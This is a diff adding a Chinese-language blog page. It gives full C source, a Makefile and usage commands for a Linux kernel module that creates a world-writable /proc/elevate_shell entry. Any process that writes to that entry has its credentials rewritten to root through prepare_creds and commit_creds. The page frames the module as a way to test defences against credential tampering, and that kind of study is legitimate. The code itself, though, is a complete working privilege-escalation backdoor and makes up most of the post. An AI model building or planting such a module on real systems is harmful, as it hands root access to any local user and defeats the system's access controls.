@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://avatars.githubusercontent.com/u/98069164?v=4"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="安装内核头文件：
+
+```Bash
+
+sudo apt update
+sudo apt install linux-headers-$(uname -r)
+
+
+sudo dnf install kernel-devel
+```
+
+编译
+```bash
+make
+```
+使用
+```bash
+sudo insmod ko_cred_tamper.ko # 安装模块
+echo 'test' > /proc/elevate_shell #往 /proc/elevate_shell写任意信息实现提权
+sudo rmmod ko_cred_tamper.ko #卸载模块
+dmesg -T | grep ko_cred_tamper # 查看内核模块日志
+```
+
+工作流程如下：
+1. 模块加载 (insmod ko_cred_tamper.ko)  
+- 初始化函数 ko_cred_tamper_init 执行
+    - 在 /proc 文件系统下创建文件 elevate_shell（权限 0666，所有用户可读写）。">
+<meta property="og:title" content="cred 提权 LKM">
+<meta property="og:description" content="安装内核头文件：
+
+```Bash
+
+sudo apt update
+sudo apt install linux-headers-$(uname -r)
+
+
+sudo dnf install kernel-devel
+```
+
+编译
+```bash
+make
+```
+使用
+```bash
+sudo insmod ko_cred_tamper.ko # 安装模块
+echo 'test' > /proc/elevate_shell #往 /proc/elevate_shell写任意信息实现提权
+sudo rmmod ko_cred_tamper.ko #卸载模块
+dmesg -T | grep ko_cred_tamper # 查看内核模块日志
+```
+
+工作流程如下：
+1. 模块加载 (insmod ko_cred_tamper.ko)  
+- 初始化函数 ko_cred_tamper_init 执行
+    - 在 /proc 文件系统下创建文件 elevate_shell（权限 0666，所有用户可读写）。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://Mon3t4r.github.io/post/cred%20-ti-quan-%20LKM.html">
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/98069164?v=4">
+<title>cred 提权 LKM</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">cred 提权 LKM</h1>
+<div class="title-right">
+    <a href="https://Mon3t4r.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/Mon3t4r/Mon3t4r.github.io/issues/2" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><p>安装内核头文件：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">sudo apt update
+sudo apt install linux-headers-<span class="pl-s"><span class="pl-pds">$(</span>uname -r<span class="pl-pds">)</span></span>
+
+
+sudo dnf install kernel-devel</pre></div>
+<p>编译</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">make</pre></div>
+<p>使用</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">sudo insmod ko_cred_tamper.ko <span class="pl-c"><span class="pl-c">#</span> 安装模块</span>
+<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>test<span class="pl-pds">"</span></span> <span class="pl-k">&gt;</span> /proc/elevate_shell <span class="pl-c"><span class="pl-c">#</span>往 /proc/elevate_shell写任意信息实现提权</span>
+sudo rmmod ko_cred_tamper.ko <span class="pl-c"><span class="pl-c">#</span>卸载模块</span>
+dmesg -T <span class="pl-k">|</span> grep ko_cred_tamper <span class="pl-c"><span class="pl-c">#</span> 查看内核模块日志</span></pre></div>
+<p>工作流程如下：</p>
+<ol>
+<li>模块加载 (insmod ko_cred_tamper.ko)</li>
+</ol>
+<ul>
+<li>初始化函数 ko_cred_tamper_init 执行
+<ul>
+<li>在 /proc 文件系统下创建文件 elevate_shell（权限 0666，所有用户可读写）。</li>
+<li>绑定文件写操作回调函数 proc_write。</li>
+<li>打印日志：</li>
+</ul>
+</li>
+</ul>
+<div class="highlight highlight-source-shell"><pre class="notranslate">ko_cred_tamper: 模块已加载。写入 /proc/elevate_shell 来尝试提权。</pre></div>
+<ol start="2">
+<li>用户触发提权操作</li>
+</ol>
+<ul>
+<li>向 /proc/elevate_shell 写入任意数据（如）：</li>
+</ul>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>test<span class="pl-pds">"</span></span> <span class="pl-k">&gt;</span> /proc/elevate_shell</pre></div>
+<ul>
+<li>内核回调 proc_write 函数
+<ul>
+<li>记录触发进程的 PID 和名称（如 bash 进程）：</li>
+</ul>
+</li>
+</ul>
+<div class="highlight highlight-source-shell"><pre class="notranslate">ko_cred_tamper: /proc/elevate_shell 的写入操作由 PID 1234 (bash) 触发。</pre></div>
+<ul>
+<li>调用核心函数 elevate_privileges() 尝试提权。</li>
+</ul>
+<ol start="3">
+<li>权限提升核心逻辑 (elevate_privileges())</li>
+</ol>
+<ul>
+<li>
+<p>步骤 1: 准备新凭证</p>
+<ul>
+<li>调用 prepare_creds() 复制当前进程的凭证结构体 struct cred。</li>
+<li>失败则打印错误：</li>
+</ul>
+</li>
+</ul>
+<div class="highlight highlight-source-shell"><pre class="notranslate">ko_cred_tamper: 无法准备新的凭证 (Unable to prepare new credentials).</pre></div>
+<ul>
+<li>步骤 2: 修改凭证为 root 权限
+<ul>
+<li>打印原始 UID/GID（如普通用户 1000）：</li>
+</ul>
+</li>
+</ul>
+<div class="highlight highlight-source-shell"><pre class="notranslate">ko_cred_tamper: 原始 UID: 1000, GID: 1000</pre></div>
+<ul>
+<li>将所有权限字段设为 0（root）：</li>
+</ul>
+<div class="highlight highlight-source-c++"><pre class="notranslate">new_creds-&gt;uid = KUIDT_INIT(<span class="pl-c1">0</span>);   <span class="pl-c"><span class="pl-c">//</span> 真实用户ID</span>
+new_creds-&gt;euid = KUIDT_INIT(<span class="pl-c1">0</span>);  <span class="pl-c"><span class="pl-c">//</span> 有效用户ID（关键权限检查点）</span>
+... <span class="pl-c"><span class="pl-c">//</span> 其他 gid/suid/fsuid 等同理</span></pre></div>
+<p>步骤 3: 提交篡改后的凭证</p>
+<ul>
+<li>调用 commit_creds(new_creds) 应用新凭证。
+<ul>
+<li>安全机制拦截点：安全模块应该在此拦截非法提权。</li>
+</ul>
+</li>
+<li>打印提权结果：</li>
+</ul>
+<div class="highlight highlight-source-shell"><pre class="notranslate">ko_cred_tamper: 正在尝试提交UID/GID为0的新凭证...
+ko_cred_tamper: 新凭证已提交。当前 UID: 0, GID: 0  <span class="pl-c"><span class="pl-c">#</span> 成功提示</span></pre></div>
+<ol start="4">
+<li>模块卸载 (rmmod ko_cred_tamper)</li>
+</ol>
+<ul>
+<li>清理函数 ko_cred_tamper_exit 执行</li>
+<li>删除 /proc/elevate_shell 文件。</li>
+<li>打印日志：</li>
+</ul>
+<div class="highlight highlight-source-shell"><pre class="notranslate">ko_cred_tamper: 模块已卸载。</pre></div>
+<p>具体代码：</p>
+<div class="highlight highlight-source-c"><pre class="notranslate"><span class="pl-k">#ko_cred_tamper</span>/ko_cred_tamper.c
+<span class="pl-c">/*</span>
+<span class="pl-c"> * =====================================================================================</span>
+<span class="pl-c"> *</span>
+<span class="pl-c"> * Filename:  ko_cred_tamper.c</span>
+<span class="pl-c"> *</span>
+<span class="pl-c"> * Description:  一个用于演示和测试内核凭证(cred)防篡改能力的内核模块。</span>
+<span class="pl-c"> * 本模块通过创建一个/proc文件作为接口，当用户向此文件写入时，</span>
+<span class="pl-c"> * 模块会尝试将当前进程的权限提升至root。</span>
+<span class="pl-c"> *</span>
+<span class="pl-c"> *</span>
+<span class="pl-c"> * =====================================================================================</span>
+<span class="pl-c"> */</span>
+
+<span class="pl-c">// --------------------------------------------------------------------------------</span>
+<span class="pl-c">// 头文件包含</span>
+<span class="pl-c">// --------------------------------------------------------------------------------</span>
+
+<span class="pl-k">#include</span> <span class="pl-s">&lt;linux/module.h&gt;</span>  <span class="pl-c">// 所有内核模块都需要，包含了加载/卸载模块的宏</span>
+<span class="pl-k">#include</span> <span class="pl-s">&lt;linux/kernel.h&gt;</span>  <span class="pl-c">// 包含内核常用函数，如 printk</span>
+<span class="pl-k">#include</span> <span class="pl-s">&lt;linux/init.h&gt;</span>    <span class="pl-c">// 包含了 __init 和 __exit 宏</span>
+<span class="pl-k">#include</span> <span class="pl-s">&lt;linux/proc_fs.h&gt;</span> <span class="pl-c">// 用于 proc 文件系统的函数，如 proc_create</span>
+<span class="pl-k">#include</span> <span class="pl-s">&lt;linux/sched.h&gt;</span>   <span class="pl-c">// 包含进程调度相关的定义，主要是 'current' 宏来获取当前进程</span>
+<span class="pl-k">#include</span> <span class="pl-s">&lt;linux/cred.h&gt;</span>    <span class="pl-c">// 定义了 'struct cred' 以及操作它的函数，如 prepare_creds/commit_creds</span>
+<span class="pl-k">#include</span> <span class="pl-s">&lt;linux/uaccess.h&gt;</span> <span class="pl-c">// 包含了在内核空间和用户空间之间复制数据的函数（本例未使用，但通常需要）</span>
+<span class="pl-k">#include</span> <span class="pl-s">&lt;linux/version.h&gt;</span> <span class="pl-c">// 包含 LINUX_VERSION_CODE 和 KERNEL_VERSION 宏，用于版本判断</span>
+
+<span class="pl-c">// --------------------------------------------------------------------------------</span>
+<span class="pl-c">// 宏定义和全局变量</span>
+<span class="pl-c">// --------------------------------------------------------------------------------</span>
+
+<span class="pl-c">// 定义我们将在/proc文件系统中创建的文件的名称</span>
+<span class="pl-k">#define</span> <span class="pl-c1">PROC_NAME</span> "elevate_shell"
+
+<span class="pl-c">// --------------------------------------------------------------------------------</span>
+<span class="pl-c">// 函数前向声明</span>
+<span class="pl-c">// --------------------------------------------------------------------------------</span>
+
+<span class="pl-c">// 在定义之前声明 proc_write 函数，这样在 proc_ops 结构体中就可以引用它了。</span>
+<span class="pl-k">static</span> <span class="pl-smi">ssize_t</span> <span class="pl-en">proc_write</span>(<span class="pl-k">struct</span> <span class="pl-smi">file</span> <span class="pl-c1">*</span><span class="pl-s1">file</span>, <span class="pl-k">const</span> <span class="pl-smi">char</span> <span class="pl-s1">__user</span> <span class="pl-c1">*</span><span class="pl-s1">usr_buf</span>, <span class="pl-smi">size_t</span> <span class="pl-s1">count</span>, <span class="pl-smi">loff_t</span> <span class="pl-c1">*</span><span class="pl-s1">pos</span>);
+
+<span class="pl-c">// --------------------------------------------------------------------------------</span>
+<span class="pl-c">// procfs 操作定义</span>
+<span class="pl-c">// --------------------------------------------------------------------------------</span>
+
+<span class="pl-c">/*</span>
+<span class="pl-c"> * 在 5.6.0 及以上版本的内核中，proc_create 函数期望使用 'struct proc_ops'。</span>
+<span class="pl-c"> * 这个结构体将文件操作（如写入、读取）与我们的处理函数关联起来。</span>
+<span class="pl-c"> * 我们只关心写入操作，所以只定义 .proc_write。</span>
+<span class="pl-c"> */</span>
+<span class="pl-k">static</span> <span class="pl-k">const</span> <span class="pl-k">struct</span> <span class="pl-smi">proc_ops</span> <span class="pl-s1">proc_fops</span> <span class="pl-c1">=</span> {
+    .<span class="pl-c1">proc_write</span> <span class="pl-c1">=</span> <span class="pl-s1">proc_write</span>, <span class="pl-c">// 将写入操作指向我们的 proc_write 函数</span>
+};
+
+<span class="pl-c">// --------------------------------------------------------------------------------</span>
+<span class="pl-c">// 核心功能函数</span>
+<span class="pl-c">// --------------------------------------------------------------------------------</span>
+
+<span class="pl-c">/**</span>
+<span class="pl-c"> * @brief elevate_privileges - 提升当前进程权限的核心函数</span>
+<span class="pl-c"> *</span>
+<span class="pl-c"> * 该函数是整个模块的关键。它创建一套新的、具有root权限的凭证，</span>
+<span class="pl-c"> * 并尝试将其应用到触发此操作的当前进程上。</span>
+<span class="pl-c"> */</span>
+<span class="pl-k">static</span> <span class="pl-smi">void</span> <span class="pl-en">elevate_privileges</span>(<span class="pl-smi">void</span>)
+{
+    <span class="pl-c">/*</span>
+<span class="pl-c">     * 'struct cred' 是内核中用于存储进程安全上下文（如UIDs, GIDs）的结构体。</span>
+<span class="pl-c">     * 直接修改 `current-&gt;cred` 是危险且在现代内核中通常被禁止的（写保护）。</span>
+<span class="pl-c">     * 正确（但从安全角度仍是篡改）的方式是使用辅助函数。</span>
+<span class="pl-c">     */</span>
+
+    <span class="pl-c">// 1. 准备一套新的凭证</span>
+    <span class="pl-c">// prepare_creds() 会为当前进程创建一份新的、可写的凭证副本。</span>
+    <span class="pl-c">// 它会正确处理引用计数等复杂问题。如果失败，则返回NULL。</span>
+    <span class="pl-k">struct</span> <span class="pl-smi">cred</span> <span class="pl-c1">*</span><span class="pl-s1">new_creds</span> <span class="pl-c1">=</span> <span class="pl-en">prepare_creds</span>();
+
+    <span class="pl-k">if</span> (<span class="pl-s1">new_creds</span> <span class="pl-c1">==</span> <span class="pl-c1">NULL</span>)
+    {
+        <span class="pl-en">pr_err</span>(<span class="pl-s">"ko_cred_tamper: 无法准备新的凭证 (Unable to prepare new credentials).\n"</span>);
+        <span class="pl-k">return</span>;
+    }
+
+    <span class="pl-c">// 使用 pr_info 打印日志到内核环形缓冲区 (dmesg)，记录原始的用户ID和组ID</span>
+    <span class="pl-c">// current_uid() 和 current_gid() 返回 kuid_t 和 kgid_t 类型</span>
+    <span class="pl-c">// from_kuid() 和 from_kgid() 将它们转换为可在日志中打印的普通整数</span>
+    <span class="pl-en">pr_info</span>(<span class="pl-s">"ko_cred_tamper: 原始 UID: %d, GID: %d\n"</span>, <span class="pl-en">from_kuid</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">init_user_ns</span>, <span class="pl-en">current_uid</span>()), <span class="pl-en">from_kgid</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">init_user_ns</span>, <span class="pl-en">current_gid</span>()));
+
+    <span class="pl-c">// 2. 修改新的凭证，将所有权相关ID设置为0 (root)</span>
+    <span class="pl-c">// KUIDT_INIT(0) 和 KGIDT_INIT(0) 是用于创建值为0的 kuid_t 和 kgid_t 类型的宏</span>
+    <span class="pl-s1">new_creds</span><span class="pl-c1">-&gt;</span><span class="pl-c1">uid</span> <span class="pl-c1">=</span> <span class="pl-en">KUIDT_INIT</span>(<span class="pl-c1">0</span>);   <span class="pl-c">// 真实用户ID (Real User ID)</span>
+    <span class="pl-s1">new_creds</span><span class="pl-c1">-&gt;</span><span class="pl-c1">gid</span> <span class="pl-c1">=</span> <span class="pl-en">KGIDT_INIT</span>(<span class="pl-c1">0</span>);   <span class="pl-c">// 真实组ID (Real Group ID)</span>
+    <span class="pl-s1">new_creds</span><span class="pl-c1">-&gt;</span><span class="pl-c1">euid</span> <span class="pl-c1">=</span> <span class="pl-en">KUIDT_INIT</span>(<span class="pl-c1">0</span>);  <span class="pl-c">// 有效用户ID (Effective User ID)，权限检查主要看这个</span>
+    <span class="pl-s1">new_creds</span><span class="pl-c1">-&gt;</span><span class="pl-c1">egid</span> <span class="pl-c1">=</span> <span class="pl-en">KGIDT_INIT</span>(<span class="pl-c1">0</span>);  <span class="pl-c">// 有效组ID (Effective Group ID)</span>
+    <span class="pl-s1">new_creds</span><span class="pl-c1">-&gt;</span><span class="pl-c1">suid</span> <span class="pl-c1">=</span> <span class="pl-en">KUIDT_INIT</span>(<span class="pl-c1">0</span>);  <span class="pl-c">// 保存的用户ID (Saved User ID)</span>
+    <span class="pl-s1">new_creds</span><span class="pl-c1">-&gt;</span><span class="pl-c1">sgid</span> <span class="pl-c1">=</span> <span class="pl-en">KGIDT_INIT</span>(<span class="pl-c1">0</span>);  <span class="pl-c">// 保存的组ID (Saved Group ID)</span>
+    <span class="pl-s1">new_creds</span><span class="pl-c1">-&gt;</span><span class="pl-c1">fsuid</span> <span class="pl-c1">=</span> <span class="pl-en">KUIDT_INIT</span>(<span class="pl-c1">0</span>); <span class="pl-c">// 文件系统用户ID (File System User ID)</span>
+    <span class="pl-s1">new_creds</span><span class="pl-c1">-&gt;</span><span class="pl-c1">fsgid</span> <span class="pl-c1">=</span> <span class="pl-en">KGIDT_INIT</span>(<span class="pl-c1">0</span>); <span class="pl-c">// 文件系统组ID (File System Group ID)</span>
+
+    <span class="pl-en">pr_info</span>(<span class="pl-s">"ko_cred_tamper: 正在尝试提交UID/GID为0的新凭证...\n"</span>);
+
+    <span class="pl-c">// 3. 将被篡改的凭证应用到当前进程</span>
+    <span class="pl-c">// commit_creds() 是应用新凭证的函数。这是最关键的一步。</span>
+    <span class="pl-c">// 内核的安全模块（LSM），如SELinux或AppArmor，会在此处设置钩子(hook)。</span>
+    <span class="pl-c">// 如果策略禁止此类操作，commit_creds() 调用会被拦截和拒绝。</span>
+    <span class="pl-en">commit_creds</span>(<span class="pl-s1">new_creds</span>);
+
+    <span class="pl-c">// 再次打印日志，验证提权后的UID/GID，检查操作是否真的成功。</span>
+    <span class="pl-en">pr_info</span>(<span class="pl-s">"ko_cred_tamper: 新凭证已提交。当前 UID: %d, GID: %d\n"</span>, <span class="pl-en">from_kuid</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">init_user_ns</span>, <span class="pl-en">current_uid</span>()), <span class="pl-en">from_kgid</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">init_user_ns</span>, <span class="pl-en">current_gid</span>()));
+}
+
+<span class="pl-c">/**</span>
+<span class="pl-c"> * @brief proc_write - /proc/elevate_shell 的写操作回调函数</span>
+<span class="pl-c"> * @param file      文件对象指针</span>
+<span class="pl-c"> * @param usr_buf   指向用户空间缓冲区的指针，包含了用户写入的数据</span>
+<span class="pl-c"> * @param count     用户写入数据的字节数</span>
+<span class="pl-c"> * @param pos       文件中的偏移量指针</span>
+<span class="pl-c"> *</span>
+<span class="pl-c"> * 当用户空间的进程向 /proc/elevate_shell 文件执行写操作时，内核会调用此函数。</span>
+<span class="pl-c"> */</span>
+<span class="pl-k">static</span> <span class="pl-smi">ssize_t</span> <span class="pl-en">proc_write</span>(<span class="pl-k">struct</span> <span class="pl-smi">file</span> <span class="pl-c1">*</span><span class="pl-s1">file</span>, <span class="pl-k">const</span> <span class="pl-smi">char</span> <span class="pl-s1">__user</span> <span class="pl-c1">*</span><span class="pl-s1">usr_buf</span>, <span class="pl-smi">size_t</span> <span class="pl-s1">count</span>, <span class="pl-smi">loff_t</span> <span class="pl-c1">*</span><span class="pl-s1">pos</span>)
+{
+    <span class="pl-c">// 打印日志，记录是哪个进程（PID和进程名）触发了此操作。</span>
+    <span class="pl-c">// 'current' 是一个指向当前进程 task_struct 的宏。</span>
+    <span class="pl-en">pr_info</span>(<span class="pl-s">"ko_cred_tamper: /proc/%s 的写入操作由 PID %d (%s) 触发。\n"</span>,
+            <span class="pl-c1">PROC_NAME</span>, <span class="pl-s1">current</span><span class="pl-c1">-&gt;</span><span class="pl-c1">pid</span>, <span class="pl-s1">current</span><span class="pl-c1">-&gt;</span><span class="pl-c1">comm</span>);
+
+    <span class="pl-c">// 调用核心函数，对触发此操作的进程尝试提权。</span>
+    <span class="pl-en">elevate_privileges</span>();
+
+    <span class="pl-c">// 即使我们没有使用用户写入的内容，也应该返回写入的字节数。</span>
+    <span class="pl-c">// 这会让用户空间的程序（如'echo'）认为写入操作成功了。</span>
+    <span class="pl-k">return</span> <span class="pl-s1">count</span>;
+}
+
+<span class="pl-c">// --------------------------------------------------------------------------------</span>
+<span class="pl-c">// 模块初始化与退出</span>
+<span class="pl-c">// --------------------------------------------------------------------------------</span>
+
+<span class="pl-c">/**</span>
+<span class="pl-c"> * @brief ko_cred_tamper_init - 模块加载时执行的初始化函数</span>
+<span class="pl-c"> *</span>
+<span class="pl-c"> * 使用 __init 宏标记，内核在模块成功加载后，可能会释放这部分代码占用的内存。</span>
+<span class="pl-c"> * @return 0 表示成功，非0表示失败。</span>
+<span class="pl-c"> */</span>
+<span class="pl-k">static</span> <span class="pl-smi">int</span> <span class="pl-s1">__init</span> <span class="pl-en">ko_cred_tamper_init</span>(<span class="pl-smi">void</span>)
+{
+    <span class="pl-c">// 使用 proc_create 创建 /proc/elevate_shell 文件。</span>
+    <span class="pl-c">// - PROC_NAME: 文件名</span>
+    <span class="pl-c">// - 0666: 文件权限，意味着任何用户都可以读写（我们主要关心写）。</span>
+    <span class="pl-c">// - NULL: 父目录，NULL表示在/proc根目录下。</span>
+    <span class="pl-c">// - &amp;proc_fops: 指向我们的文件操作结构体。</span>
+    <span class="pl-k">if</span> (<span class="pl-en">proc_create</span>(<span class="pl-c1">PROC_NAME</span>, <span class="pl-c1">0666</span>, <span class="pl-c1">NULL</span>, <span class="pl-c1">&amp;</span><span class="pl-s1">proc_fops</span>) <span class="pl-c1">==</span> <span class="pl-c1">NULL</span>)
+    {
+        <span class="pl-en">pr_err</span>(<span class="pl-s">"ko_cred_tamper: 创建 /proc/%s 失败。\n"</span>, <span class="pl-c1">PROC_NAME</span>);
+        <span class="pl-k">return</span> <span class="pl-c1">-</span><span class="pl-c1">ENOMEM</span>; <span class="pl-c">// 返回内存不足错误</span>
+    }
+
+    <span class="pl-en">pr_info</span>(<span class="pl-s">"ko_cred_tamper: 模块已加载。写入 /proc/%s 来尝试提权。\n"</span>, <span class="pl-c1">PROC_NAME</span>);
+    <span class="pl-k">return</span> <span class="pl-c1">0</span>; <span class="pl-c">// 返回0表示模块加载成功</span>
+}
+
+<span class="pl-c">/**</span>
+<span class="pl-c"> * @brief ko_cred_tamper_exit - 模块卸载时执行的清理函数</span>
+<span class="pl-c"> *</span>
+<span class="pl-c"> * 使用 __exit 宏标记。</span>
+<span class="pl-c"> */</span>
+<span class="pl-k">static</span> <span class="pl-smi">void</span> <span class="pl-s1">__exit</span> <span class="pl-en">ko_cred_tamper_exit</span>(<span class="pl-smi">void</span>)
+{
+    <span class="pl-c">// 在模块卸载时，清理创建的proc文件，否则会留下一个无用的入口。</span>
+    <span class="pl-en">remove_proc_entry</span>(<span class="pl-c1">PROC_NAME</span>, <span class="pl-c1">NULL</span>);
+    <span class="pl-en">pr_info</span>(<span class="pl-s">"ko_cred_tamper: 模块已卸载。\n"</span>);
+}
+
+<span class="pl-c">// --------------------------------------------------------------------------------</span>
+<span class="pl-c">// 模块注册</span>
+<span class="pl-c">// --------------------------------------------------------------------------------</span>
+
+<span class="pl-c">// 注册初始化函数</span>
+<span class="pl-en">module_init</span>(<span class="pl-s1">ko_cred_tamper_init</span>);
+<span class="pl-c">// 注册退出函数</span>
+<span class="pl-en">module_exit</span>(<span class="pl-s1">ko_cred_tamper_exit</span>);
+
+<span class="pl-c">// --------------------------------------------------------------------------------</span>
+<span class="pl-c">// 模块元数据</span>
+<span class="pl-c">// --------------------------------------------------------------------------------</span>
+
+<span class="pl-en">MODULE_LICENSE</span>(<span class="pl-s">"GPL"</span>);                                                 
+<span class="pl-en">MODULE_AUTHOR</span>(<span class="pl-s">"best1a"</span>); 
+<span class="pl-en">MODULE_DESCRIPTION</span>(<span class="pl-s">"一个用于测试内核'struct cred'防篡改能力的模块。"</span>); </pre></div>
+<p>Make file</p>
+<div class="highlight highlight-source-makefile"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 当前内核源码的路径</span>
+<span class="pl-smi">KDIR</span> := /lib/modules/<span class="pl-s">$(<span class="pl-c1">shell</span> uname -r)</span>/build
+
+<span class="pl-c"><span class="pl-c">#</span> 内核模块的目标文件名</span>
+<span class="pl-smi">obj-m</span> := ko_cred_tamper.o
+
+<span class="pl-smi">PWD</span> := <span class="pl-s">$(<span class="pl-c1">shell</span> pwd)</span>
+
+<span class="pl-en">all</span>:
+	<span class="pl-s">$(<span class="pl-c1">MAKE</span>)</span> -C <span class="pl-s">$(<span class="pl-smi">KDIR</span>)</span> M=<span class="pl-s">$(<span class="pl-smi">PWD</span>)</span> modules
+
+<span class="pl-en">clean</span>:
+	<span class="pl-s">$(<span class="pl-c1">MAKE</span>)</span> -C <span class="pl-s">$(<span class="pl-smi">KDIR</span>)</span> M=<span class="pl-s">$(<span class="pl-smi">PWD</span>)</span> clean</pre></div></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://Mon3t4r.github.io">自由贩卖机</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 